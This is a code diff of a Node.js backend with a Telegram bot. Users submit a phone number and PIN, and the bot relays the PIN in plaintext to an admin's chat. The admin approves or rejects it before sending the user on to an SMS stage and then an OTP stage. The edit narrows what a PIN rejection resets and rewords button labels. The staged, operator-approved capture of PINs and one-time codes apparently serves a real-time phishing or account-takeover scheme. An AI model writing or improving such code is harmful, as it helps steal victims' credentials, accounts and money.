@@ -335,9 +335,9 @@ bot.on('callback_query', async (callbackQuery) => {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application record not found.', show_alert: true });
     }
 
-    // ── STAGE 1: PIN REJECTION ──
+    // ── STAGE 1: PIN REJECTION (Only set pinStatus to 'rejected' so user is prompted to re-enter PIN) ──
     if (action === 'deny' && type === 'pin') {
-        await db.updateApplication(applicationId, { pinStatus: 'rejected', smsStatus: 'rejected', otpStatus: 'rejected' });
+        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
         await bot.editMessageText(`
 ❌ *STAGE 1: PIN REJECTED*
 
@@ -345,11 +345,11 @@ bot.on('callback_query', async (callbackQuery) => {
 📞 Phone: \`${formatPhone(application.phoneNumber)}\`
 🔑 PIN Submitted: \`${application.pin}\`
 
-Status: *Rejected by Admin (User returned to retry)*
+Status: *Rejected by Admin (User returned to retry PIN)*
 👤 Handled by: ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ PIN rejected. User sent back to re-verify.' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ PIN rejected. User sent back to re-enter PIN.' });
     }
 
     // ── STAGE 1 APPROVAL -> PROCEED TO STAGE 2 (SMS) ──
@@ -503,7 +503,7 @@ app.post('/api/verify-pin', async (req, res) => {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Reject & Return to Redo', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
+                    [{ text: '❌ Reject PIN (Redo)', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                     [{ text: '✅ Approve PIN -> Next (SMS)', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                 ]
             }
